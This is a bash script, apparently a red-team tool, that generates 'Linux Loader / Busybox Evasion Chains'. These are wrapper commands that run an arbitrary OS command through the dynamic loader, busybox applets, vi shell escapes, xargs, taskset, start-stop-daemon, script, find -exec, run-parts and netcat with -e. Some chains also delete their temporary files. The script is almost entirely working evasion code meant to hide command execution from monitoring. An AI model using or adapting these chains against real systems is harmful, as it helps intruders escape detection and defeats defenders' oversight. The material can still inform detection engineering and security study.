#!/bin/bash

list(){

	clear

	printf "\n\t::::: Linux Loader / Busybox Evasion Chains :::::\n"
	printf "\n\t::::: Possible chain for: $command $command_args:::::\n"
	printf "\n\t${red}_______________________________________________${reset}\n\n"
	for i in "${masks[@]}"; do echo "${green}#${reset} " $i; done
	printf "\n\t${red}_______________________________________________${reset}\n\n"

}


random(){

	# Seed random generator
	random=$$$(date +%s)

	# Get random mask...
	mask=${masks[$random % ${#masks[@]} ]}
	printf "\n%s\n" "$mask"

}

usage(){

	printf "Usage:  <%s> <list|rand> <os command> <os command args>\n" $1
	printf "	          list: list all\n"
	printf "	          rand: pick random\n"

	exit 1
}

if [[ $# -lt 2 ]]
then
	usage $0
fi


##### Option 
action="$1"
shift

##### Passed OS command
command=$1
shift

#### OS command args
command_args="$@"



#### Vars
echo="/bin/echo"
mktemp="/bin/mktemp"
busybox="/bin/busybox"
rm="/bin/rm"
mkdir="/bin/mkdir"
ln="/bin/ln"
tput="/usr/bin/tput"

loader64="/lib64/ld-linux-x86-64.so.2"
tty="/usr/bin/tty"
dirname="/usr/bin/dirname"
basename="/usr/bin/basename"
script="/usr/bin/script"
taskset="/usr/bin/taskset"
vi="/usr/bin/vi"
which="/usr/bin/which"

ssd="/sbin/start-stop-daemon"

#### Aux
red=$($tput setaf 1)
green=$($tput setaf 2)
reset=$($tput sgr0)

ltfile=$( echo "\$($loader64 $busybox mktemp)")
ltty=$( echo "\$($loader64 $busybox tty)")
ldir=$(echo "\$($loader64 $busybox mkdir /tmp/)")


masks=(
	"$loader64 $busybox vi $ltfile  -c ':.!$command $command_args'  -c ':q!' && $rm $ltfile"
	"$vi -ensX $ltfile  -c ':silent !$command $command_args'  -c ':q!' && $rm $ltfile"
	"$loader64 $busybox time -o /dev/null $command $command_args"
	"$busybox time -o /dev/null $command $command_args"
	"$loader64 $busybox timeout $command $command_args"
	"$busybox timeout $command $command_args"
	"$loader64 $busybox  xargs $busybox xargs xargs $busybox $command $command_args < /dev/null"
	"$busybox  xargs $busybox xargs xargs $busybox $command $command_args < /dev/null"
	"$busybox  xargs $busybox $command $command_args < /dev/null"
	"$busybox  xargs $command $command_args < /dev/null"
	"$taskset 0x00000001 $command $command_args"	
	"$busybox taskset 0x00000001 $command $command_args"	
	"$ssd --start -x $command $command_args"
	"$busybox setsid  -c $command $command_args"
	"$script -q -c \"$command $command_args\"; $rm typescript"
	"$loader64 $busybox  nc -f $ltty  -e $command $command_args"
	"$busybox  nc -f $ltty  -e $command $command_args"
	"$loader64 $busybox  find $($dirname -- $command) -name $($basename -- $command) -exec $command $command_args {} \;"
	"$loader64 $busybox  openvt -c 5  -w $command $command_args > /tmp/out"
	"$ldir && $ln -s $( which $command) <dir>/$($basename -- $command) && $loader64 $busybox  run-parts  $d && /bin/rm -rf <dir>"
)

case $action in
"list")
  list
  ;;
"rand")
  random
  ;;
*)
  usage
  ;;
esac
